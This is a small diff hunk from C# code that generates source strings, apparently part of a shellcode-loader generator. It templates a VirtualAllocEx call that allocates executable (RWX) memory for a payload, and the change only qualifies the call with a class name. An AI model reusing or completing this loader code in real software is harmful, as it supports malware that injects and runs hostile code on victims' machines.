@@ -150,7 +150,7 @@ catch
         private static readonly string sig_VirtualAllocEx = "        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
         public static string pinvoke_VirtualAllocEx = dllImportAttrib + sig_VirtualAllocEx + "\n\n\t\t";
         public static string call_VirtualAllocEx = @"
-            IntPtr pMemoryAllocation = VirtualAllocEx(hCurrentProcess, IntPtr.Zero, (uint)(payload.Length), 0x3000, 0x40);
+            IntPtr pMemoryAllocation = PInvokes.VirtualAllocEx(hCurrentProcess, IntPtr.Zero, (uint)(payload.Length), 0x3000, 0x40);
             if (pMemoryAllocation == IntPtr.Zero)
             {
                 return;
